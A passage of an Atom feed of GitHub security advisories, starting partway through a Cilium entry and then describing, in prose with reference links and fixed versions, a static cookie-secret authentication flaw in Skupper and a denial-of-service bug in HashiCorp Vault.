<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-7496-fgv9-xw82">https://github.com/cilium/cilium/security/advisories/GHSA-7496-fgv9-xw82</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25630">https://nvd.nist.gov/vuln/detail/CVE-2024-25630</a></li>
<li><a href="https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg">https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.14.7">https://github.com/cilium/cilium/releases/tag/v1.14.7</a></li>
<li><a href="https://github.com/advisories/GHSA-7496-fgv9-xw82">https://github.com/advisories/GHSA-7496-fgv9-xw82</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7496-fgv9-xw82</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-20T23:44:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/skupperproject/skupper] Skupper uses a static cookie secret for the openshift oauth-proxy]]></title>
        <id>https://github.com/advisories/GHSA-w799-v85j-88pg</id>
        <link href="https://github.com/advisories/GHSA-w799-v85j-88pg"/>
        <updated>2024-07-19T16:55:25.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in Skupper. When Skupper is initialized with the console-enabled and with console-auth set to Openshift, it configures the openshift oauth-proxy with a static cookie-secret. In certain circumstances, this may allow an attacker to bypass authentication to the Skupper console via a specially-crafted cookie.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6535">https://nvd.nist.gov/vuln/detail/CVE-2024-6535</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-6535">https://access.redhat.com/security/cve/CVE-2024-6535</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2296024">https://bugzilla.redhat.com/show_bug.cgi?id=2296024</a></li>
<li><a href="https://github.com/skupperproject/skupper/commit/d2cb3782e807853694ee66b6e3d4a1917485eb71">https://github.com/skupperproject/skupper/commit/d2cb3782e807853694ee66b6e3d4a1917485eb71</a></li>
<li><a href="https://github.com/advisories/GHSA-w799-v85j-88pg">https://github.com/advisories/GHSA-w799-v85j-88pg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w799-v85j-88pg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-17T03:31:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] Hashicorp Vault vulnerable to Improper Check or Handling of Exceptional Conditions ]]></title>
        <id>https://github.com/advisories/GHSA-2qmw-pvf7-4mw6</id>
        <link href="https://github.com/advisories/GHSA-2qmw-pvf7-4mw6"/>
        <updated>2024-07-16T17:33:40.000Z</updated>
        <content type="html"><![CDATA[<p>Vault and Vault Enterprise did not properly handle requests originating from unauthorized IP addresses when the TCP listener option, proxy_protocol_behavior, was set to deny_unauthorized. When receiving a request from a source IP address that was not listed in proxy_protocol_authorized_addrs, the Vault API server would shut down and no longer respond to any HTTP requests, potentially resulting in denial of service.</p>
<p>While this bug also affected versions of Vault up to 1.17.1 and 1.16.5, a separate regression in those release series did not allow Vault operators to configure the deny_unauthorized option, thus not allowing the conditions for the denial of service to occur.</p>
<p>Fixed in Vault and Vault Enterprise 1.17.2, 1.16.6, and 1.15.12.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6468">https://nvd.nist.gov/vuln/detail/CVE-2024-6468</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2024-14-vault-vulnerable-to-denial-of-service-when-setting-a-proxy-protocol-behavior/68518">https://discuss.hashicorp.com/t/hcsec-2024-14-vault-vulnerable-to-denial-of-service-when-setting-a-proxy-protocol-behavior/68518</a></li>
<li><a href="https://github.com/advisories/GHSA-2qmw-pvf7-4mw6">https://github.com/advisories/GHSA-2qmw-pvf7-4mw6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2qmw-pvf7-4mw6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-11T21:31:13.000Z</published>
    </entry>
</feed>